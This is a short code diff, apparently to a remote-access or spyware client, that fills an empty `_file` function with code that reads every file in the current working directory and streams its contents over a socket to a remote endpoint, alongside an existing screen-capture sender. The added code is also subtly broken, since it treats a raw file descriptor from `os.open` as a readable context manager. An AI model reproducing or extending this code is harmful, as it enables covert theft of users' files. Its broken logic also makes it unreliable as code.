@@ -27,7 +27,19 @@ def _screen(sock):
     sock.send(b'\xff\xff\xff\xff eof')
 
 def _file(sock):
-    pass
+    current_dir = os.getcwd()
+    files = os.listdir(current_dir)
+    for file in files:
+        if (os.path.isfile(file)):
+            sleep(0.1)
+            sock.send(b'\xfe\xdf\x10\x02START_OF_FILE'+file.encode())
+            with os.open(file, os.O_RDONLY) as f:
+                finf = os.fstat(f)
+                for _ in range((finf.st_size // CHUNKSIZE) + 1):
+                    sock.send(f.read(CHUNKSIZE))
+                sleep(0.1)
+                sock.send(b'\xff\xff\xff\xff eof')
+
 
 def main():
     sock = init()
